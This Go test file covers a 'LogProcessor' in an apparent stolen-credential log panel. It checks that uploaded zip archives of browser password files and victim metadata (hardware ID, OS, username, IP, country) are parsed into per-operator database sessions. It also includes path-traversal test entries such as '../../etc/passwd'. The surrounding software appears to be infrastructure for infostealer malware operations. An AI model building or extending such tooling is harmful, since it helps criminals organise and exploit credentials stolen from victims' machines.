package services_test

import (
	"archive/zip"
	"bytes"
	"database/sql"
	"os"
	"strings"
	"testing"

	"github.com/google/uuid"
	"zialfi-panel/internal/db"
	"zialfi-panel/internal/services"
)

func openTestDB(t *testing.T) *sql.DB {
	t.Helper()
	f, err := os.CreateTemp(t.TempDir(), "mirage-test-*.db")
	if err != nil {
		t.Fatal(err)
	}
	f.Close()
	d, err := db.OpenDB(f.Name())
	if err != nil {
		t.Fatal(err)
	}
	if err := db.RunMigrations(d, db.MigrationsFS); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { d.Close() })
	return d
}

func createTestZip(t *testing.T, files map[string]string) []byte {
	t.Helper()
	var buf bytes.Buffer
	zw := zip.NewWriter(&buf)
	for name, content := range files {
		w, err := zw.Create(name)
		if err != nil {
			t.Fatal(err)
		}
		if _, err := w.Write([]byte(content)); err != nil {
			t.Fatal(err)
		}
	}
	zw.Close()
	return buf.Bytes()
}

func TestProcess_ValidZip(t *testing.T) {
	d := openTestDB(t)
	processor := services.NewLogProcessor(d, nil, db.ProviderSQLite)

	archive := createTestZip(t, map[string]string{
		"Browser Data/Chrome_passwords.txt": "https://example.com\tuser1\tpass1\nhttps://google.com\tuser2\tpass2",
		"system_info.txt":                   "CPU=Intel i7\nRAM=32GB\nHostname=DESKTOP-ABC",
	})

	metadata := `{"hwid":"hw-001","os":"win10","username":"alice","ip":"1.2.3.4","country":"US"}`
	sessionID, err := processor.Process(archive, metadata, "test-user-id")
	if err != nil {
		t.Fatal(err)
	}
	if sessionID == "" {
		t.Fatal("expected non-empty session ID")
	}

	var count int
	d.QueryRow("SELECT COUNT(*) FROM sessions WHERE id=?", sessionID).Scan(&count)
	if count != 1 {
		t.Errorf("expected 1 session, got %d", count)
	}

	d.QueryRow("SELECT COUNT(*) FROM passwords WHERE session_id=?", sessionID).Scan(&count)
	if count != 2 {
		t.Errorf("expected 2 passwords, got %d", count)
	}

	var hwid, os, username, ip, country string
	d.QueryRow("SELECT hwid, os, username, ip, country_code FROM sessions WHERE id=?", sessionID).Scan(&hwid, &os, &username, &ip, &country)
	if hwid != "hw-001" {
		t.Errorf("hwid = %q, want hw-001", hwid)
	}
	if os != "win10" {
		t.Errorf("os = %q, want win10", os)
	}
	if username != "alice" {
		t.Errorf("username = %q, want alice", username)
	}
	if ip != "1.2.3.4" {
		t.Errorf("ip = %q, want 1.2.3.4", ip)
	}
	if country != "US" {
		t.Errorf("country = %q, want US", country)
	}

	var passwords int
	d.QueryRow("SELECT COUNT(*) FROM passwords p JOIN sessions s ON s.id = p.session_id WHERE p.url = 'https://example.com' AND p.username = 'user1'").Scan(&passwords)
	if passwords != 1 {
		t.Errorf("expected specific password, got %d", passwords)
	}
}

func TestProcess_PathTraversal(t *testing.T) {
	d := openTestDB(t)
	processor := services.NewLogProcessor(d, nil, db.ProviderSQLite)

	archive := createTestZip(t, map[string]string{
		"../../etc/passwd": "root:x:0:0:root:/root:/bin/bash",
	})

	sessionID, err := processor.Process(archive, "", "test-user-id")
	if err != nil {
		t.Fatal(err)
	}
	if sessionID == "" {
		t.Fatal("expected non-empty session ID")
	}

	var count int
	d.QueryRow("SELECT COUNT(*) FROM sessions WHERE id=?", sessionID).Scan(&count)
	if count != 1 {
		t.Errorf("expected session created, got %d", count)
	}
}

func TestProcess_AbsolutePath(t *testing.T) {
	d := openTestDB(t)
	processor := services.NewLogProcessor(d, nil, db.ProviderSQLite)

	archive := createTestZip(t, map[string]string{
		"/etc/passwd": "root:x:0:0:root:/root:/bin/bash",
	})

	_, err := processor.Process(archive, "", "test-user-id")
	if err != nil {
		t.Fatal(err)
	}

	var count int
	d.QueryRow("SELECT COUNT(*) FROM sessions").Scan(&count)
	if count != 1 {
		t.Errorf("expected session created, got %d", count)
	}
}

func TestProcess_EmptyZip(t *testing.T) {
	d := openTestDB(t)
	processor := services.NewLogProcessor(d, nil, db.ProviderSQLite)

	archive := createTestZip(t, map[string]string{})
	sessionID, err := processor.Process(archive, "{}", "test-user-id")
	if err != nil {
		t.Fatal(err)
	}

	var count int
	d.QueryRow("SELECT COUNT(*) FROM sessions WHERE id=?", sessionID).Scan(&count)
	if count != 1 {
		t.Errorf("expected 1 session, got %d", count)
	}

	var sID string
	d.QueryRow("SELECT id FROM sessions").Scan(&sID)
	if sID != sessionID {
		t.Errorf("session ID mismatch: %s vs %s", sID, sessionID)
	}
}

func TestProcess_MalformedMetadata(t *testing.T) {
	d := openTestDB(t)
	processor := services.NewLogProcessor(d, nil, db.ProviderSQLite)

	archive := createTestZip(t, map[string]string{
		"passwords.txt": "https://x.com\tu\tp",
	})

	sessionID, err := processor.Process(archive, "{not valid json!!!", "test-user-id")
	if err != nil {
		t.Fatal(err)
	}

	var count int
	d.QueryRow("SELECT COUNT(*) FROM sessions WHERE id=?", sessionID).Scan(&count)
	if count != 1 {
		t.Errorf("expected 1 session, got %d", count)
	}

	var passwords int
	d.QueryRow("SELECT COUNT(*) FROM passwords WHERE session_id=?", sessionID).Scan(&passwords)
	if passwords != 1 {
		t.Errorf("expected 1 password, got %d", passwords)
	}
}

func TestProcess_MultipleBrowsers(t *testing.T) {
	d := openTestDB(t)
	processor := services.NewLogProcessor(d, nil, db.ProviderSQLite)

	archive := createTestZip(t, map[string]string{
		"Browser Data/Chrome_passwords.txt":  "https://a.com\tu1\tp1",
		"Browser Data/Firefox_passwords.txt": "https://b.com\tu2\tp2",
	})

	sessionID, err := processor.Process(archive, "{}", "test-user-id")
	if err != nil {
		t.Fatal(err)
	}

	var count int
	d.QueryRow("SELECT COUNT(*) FROM passwords WHERE session_id=?", sessionID).Scan(&count)
	if count != 2 {
		t.Errorf("expected 2 passwords, got %d", count)
	}

	var browsers []string
	rows, err := d.Query("SELECT browser FROM passwords WHERE session_id=? ORDER BY url", sessionID)
	if err != nil {
		t.Fatal(err)
	}
	defer rows.Close()
	for rows.Next() {
		var b string
		rows.Scan(&b)
		browsers = append(browsers, b)
	}
	if len(browsers) != 2 {
		t.Fatalf("expected 2 browser entries, got %d", len(browsers))
	}
	if browsers[0] != "chrome" {
		t.Errorf("expected chrome, got %s", browsers[0])
	}
	if browsers[1] != "firefox" {
		t.Errorf("expected firefox, got %s", browsers[1])
	}
}

func TestProcess_MultiplePasswordLines(t *testing.T) {
	d := openTestDB(t)
	processor := services.NewLogProcessor(d, nil, db.ProviderSQLite)

	var lines []string
	for i := 0; i < 10; i++ {
		lines = append(lines, "https://site"+uuid.New().String()[:4]+".com\tuser\tpass")
	}

	archive := createTestZip(t, map[string]string{
		"passwords.txt": strings.Join(lines, "\n"),
	})

	sessionID, err := processor.Process(archive, "{}", "test-user-id")
	if err != nil {
		t.Fatal(err)
	}

	var count int
	d.QueryRow("SELECT COUNT(*) FROM passwords WHERE session_id=?", sessionID).Scan(&count)
	if count != 10 {
		t.Errorf("expected 10 passwords, got %d", count)
	}
}

func TestProcess_MalformedLine(t *testing.T) {
	d := openTestDB(t)
	processor := services.NewLogProcessor(d, nil, db.ProviderSQLite)

	content := "https://good.com\tuser\tpass\nmalformed\nhttps://another.com\tu2\tp2"
	archive := createTestZip(t, map[string]string{
		"passwords.txt": content,
	})

	sessionID, err := processor.Process(archive, "{}", "test-user-id")
	if err != nil {
		t.Fatal(err)
	}

	var count int
	d.QueryRow("SELECT COUNT(*) FROM passwords WHERE session_id=?", sessionID).Scan(&count)
	if count != 2 {
		t.Errorf("expected 2 passwords (malformed line skipped), got %d", count)
	}
}


func TestProcess_SetsOwnerID(t *testing.T) {
	d := openTestDB(t)
	processor := services.NewLogProcessor(d, nil, db.ProviderSQLite)

	archive := createTestZip(t, map[string]string{
		"passwords.txt": "https://example.com\tuser\tpass",
	})

	sessionID, err := processor.Process(archive, "{}", "user-123")
	if err != nil {
		t.Fatal(err)
	}

	var ownerID string
	err = d.QueryRow("SELECT COALESCE(owner_id, '') FROM sessions WHERE id = ?", sessionID).Scan(&ownerID)
	if err != nil {
		t.Fatal(err)
	}
	if ownerID != "user-123" {
		t.Errorf("owner_id = %q, want user-123", ownerID)
	}
}
